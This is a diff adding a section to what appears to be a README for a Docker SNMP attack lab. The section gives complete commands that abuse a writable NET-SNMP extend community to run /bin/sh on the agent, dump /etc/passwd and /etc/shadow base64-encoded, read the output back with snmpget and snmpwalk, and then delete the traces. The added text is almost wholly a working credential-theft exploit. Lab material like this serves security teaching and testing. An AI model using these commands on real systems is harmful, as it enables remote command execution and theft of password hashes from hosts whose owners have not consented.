@@ -225,6 +225,44 @@ docker exec snmp-attacker snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private snmp-a
   'nsExtendStatus."id"' = destroy
 ```
 
+### Dump /etc/passwd and /etc/shadow via SNMP (base64 encoded)
+
+Exfiltrate both credential files, base64 encoded to avoid SNMP string truncation.
+
+Dump `/etc/passwd`:
+
+```bash
+docker exec snmp-attacker snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private snmp-agent \
+  'nsExtendStatus."passwd"'  = createAndGo \
+  'nsExtendCommand."passwd"' = /bin/sh \
+  'nsExtendArgs."passwd"'    = '-c "cat /etc/passwd | base64"'
+
+docker exec snmp-attacker snmpget -m +NET-SNMP-EXTEND-MIB -v2c -c public snmp-agent \
+  NET-SNMP-EXTEND-MIB::nsExtendOutputFull.'"passwd"' 2>/dev/null \
+  | awk -F'STRING: ' '{print $2}' | base64 -d
+```
+
+Dump `/etc/shadow`:
+
+```bash
+docker exec snmp-attacker snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private snmp-agent \
+  'nsExtendStatus."shadow"'  = createAndGo \
+  'nsExtendCommand."shadow"' = /bin/sh \
+  'nsExtendArgs."shadow"'    = '-c "cat /etc/shadow | base64"'
+
+docker exec snmp-attacker snmpwalk -m +NET-SNMP-EXTEND-MIB -v2c -c public snmp-agent \
+  NET-SNMP-EXTEND-MIB::nsExtendOutLine.'"shadow"' 2>/dev/null \
+  | awk -F'STRING: ' '{print $2}' | tr -d '\n' | base64 -d
+```
+
+Clean up both rows:
+
+```bash
+docker exec snmp-attacker snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private snmp-agent \
+  'nsExtendStatus."passwd"' = destroy \
+  'nsExtendStatus."shadow"' = destroy
+```
+
 ---
 
 ## Stop and clean up
